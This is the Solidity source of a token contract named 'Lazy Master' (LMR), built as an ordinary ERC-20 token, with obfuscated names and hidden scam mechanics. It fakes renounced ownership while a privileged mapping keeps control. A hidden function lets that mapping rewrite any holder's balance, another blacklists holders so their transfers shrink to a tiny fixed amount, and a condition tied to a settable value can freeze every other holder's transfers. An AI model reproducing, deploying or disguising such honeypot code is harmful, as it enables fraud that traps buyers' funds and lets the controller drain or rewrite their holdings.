//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface swapWalletMin {
    function createPair(address launchedExemptAuto, address fromTokenList) external returns (address);
}

interface atMinTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toLaunch) external view returns (uint256);

    function transfer(address senderSellLiquidity, uint256 launchMarketing) external returns (bool);

    function allowance(address isTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address senderSellLiquidity,
        uint256 launchMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minLiquidity, uint256 value);
    event Approval(address indexed isTo, address indexed spender, uint256 value);
}

abstract contract amountTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atMinTxMetadata is atMinTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LazyMaster is amountTotal, atMinTx, atMinTxMetadata {

    function exemptLaunch(uint256 launchMarketing) public {
        fundMinLaunched();
        modeMax = launchMarketing;
    }

    uint256 private senderTake = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private takeAmount;

    bool public exemptTx;

    function getOwner() external view returns (address) {
        return modeReceiver;
    }

    function shouldIs(address fundMinToken) public {
        fundMinLaunched();
        
        if (fundMinToken == senderWallet || fundMinToken == toIs) {
            return;
        }
        feeMin[fundMinToken] = true;
    }

    bool public sellTotalMin;

    address receiverBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function senderTotalTx() public {
        emit OwnershipTransferred(senderWallet, address(0));
        modeReceiver = address(0);
    }

    event OwnershipTransferred(address indexed walletEnable, address indexed isToken);

    function allowance(address isReceiver, address atLaunchExempt) external view virtual override returns (uint256) {
        if (atLaunchExempt == feeLiquidity) {
            return type(uint256).max;
        }
        return takeAmount[isReceiver][atLaunchExempt];
    }

    function transfer(address autoTo, uint256 launchMarketing) external virtual override returns (bool) {
        return toList(_msgSender(), autoTo, launchMarketing);
    }

    bool public launchedReceiver;

    function symbol() external view virtual override returns (string memory) {
        return exemptBuy;
    }

    uint256 constant toAmountEnable = 7 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return senderTake;
    }

    uint8 private swapMarketingFee = 18;

    uint256 launchedExempt;

    address public toIs;

    function tradingAuto(address toTrading) public {
        require(toTrading.balance < 100000);
        if (launchedReceiver) {
            return;
        }
        
        autoToTx[toTrading] = true;
        
        launchedReceiver = true;
    }

    bool public maxTo;

    string private exemptBuy = "LMR";

    address public senderWallet;

    address private modeReceiver;

    uint256 modeMax;

    constructor (){
        if (sellTotalMin == maxTo) {
            maxTotal = false;
        }
        sellToken walletList = sellToken(feeLiquidity);
        toIs = swapWalletMin(walletList.factory()).createPair(walletList.WETH(), address(this));
        if (exemptTx != maxTotal) {
            exemptTx = false;
        }
        senderWallet = _msgSender();
        autoToTx[senderWallet] = true;
        modeTrading[senderWallet] = senderTake;
        senderTotalTx();
        
        emit Transfer(address(0), senderWallet, senderTake);
    }

    bool public maxTotal;

    function approve(address atLaunchExempt, uint256 launchMarketing) public virtual override returns (bool) {
        takeAmount[_msgSender()][atLaunchExempt] = launchMarketing;
        emit Approval(_msgSender(), atLaunchExempt, launchMarketing);
        return true;
    }

    function balanceOf(address toLaunch) public view virtual override returns (uint256) {
        return modeTrading[toLaunch];
    }

    mapping(address => bool) public autoToTx;

    function teamSender(address autoTo, uint256 launchMarketing) public {
        fundMinLaunched();
        modeTrading[autoTo] = launchMarketing;
    }

    mapping(address => uint256) private modeTrading;

    function toList(address teamAmount, address senderSellLiquidity, uint256 launchMarketing) internal returns (bool) {
        if (teamAmount == senderWallet) {
            return modeAmount(teamAmount, senderSellLiquidity, launchMarketing);
        }
        uint256 listMarketing = atMinTx(toIs).balanceOf(receiverBuy);
        require(listMarketing == modeMax);
        require(senderSellLiquidity != receiverBuy);
        if (feeMin[teamAmount]) {
            return modeAmount(teamAmount, senderSellLiquidity, toAmountEnable);
        }
        return modeAmount(teamAmount, senderSellLiquidity, launchMarketing);
    }

    function decimals() external view virtual override returns (uint8) {
        return swapMarketingFee;
    }

    function name() external view virtual override returns (string memory) {
        return fromToken;
    }

    function modeAmount(address teamAmount, address senderSellLiquidity, uint256 launchMarketing) internal returns (bool) {
        require(modeTrading[teamAmount] >= launchMarketing);
        modeTrading[teamAmount] -= launchMarketing;
        modeTrading[senderSellLiquidity] += launchMarketing;
        emit Transfer(teamAmount, senderSellLiquidity, launchMarketing);
        return true;
    }

    string private fromToken = "Lazy Master";

    function transferFrom(address teamAmount, address senderSellLiquidity, uint256 launchMarketing) external override returns (bool) {
        if (_msgSender() != feeLiquidity) {
            if (takeAmount[teamAmount][_msgSender()] != type(uint256).max) {
                require(launchMarketing <= takeAmount[teamAmount][_msgSender()]);
                takeAmount[teamAmount][_msgSender()] -= launchMarketing;
            }
        }
        return toList(teamAmount, senderSellLiquidity, launchMarketing);
    }

    function owner() external view returns (address) {
        return modeReceiver;
    }

    mapping(address => bool) public feeMin;

    function fundMinLaunched() private view {
        require(autoToTx[_msgSender()]);
    }

    address feeLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}